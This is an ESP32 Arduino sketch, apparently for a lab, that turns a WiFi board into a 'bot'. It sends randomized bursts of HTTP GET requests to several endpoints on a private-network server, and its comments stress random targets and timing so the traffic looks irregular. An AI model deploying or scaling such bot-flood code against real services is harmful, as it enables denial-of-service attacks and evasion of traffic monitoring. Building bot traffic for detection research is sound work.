#include <WiFi.h>
#include <HTTPClient.h>

// WiFi
const char* ssid = "Mi 10i";
const char* password = "";

// Targets (multiple endpoints)
String targets[] = {
  "http://10.221.202.11:5000",
  "http://10.221.202.11:5000/api",
  "http://10.221.202.11:5000/data",
  "http://10.221.202.11:5000/stats"
};

int numTargets = 4;

void setup() {
  Serial.begin(115200);

  WiFi.begin(ssid, password);
  Serial.print("Connecting");

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }

  Serial.println("\n✅ Connected to WiFi");
}

void loop() {

  if (WiFi.status() == WL_CONNECTED) {

    // 🔥 RANDOM BURST SIZE (key for botnet)
    int burst = random(1, 5);

    for (int i = 0; i < burst; i++) {

      HTTPClient http;

      // 🔥 RANDOM TARGET
      String url = targets[random(0, numTargets)];

      http.begin(url);
      http.GET();
      http.end();

      Serial.println("Bot packet sent");

      // 🔥 VERY RANDOM SMALL DELAY
      delay(random(10, 120));
    }
  }

  // 🔥 BIG RANDOM GAP (MOST IMPORTANT)
  delay(random(200, 800));
}
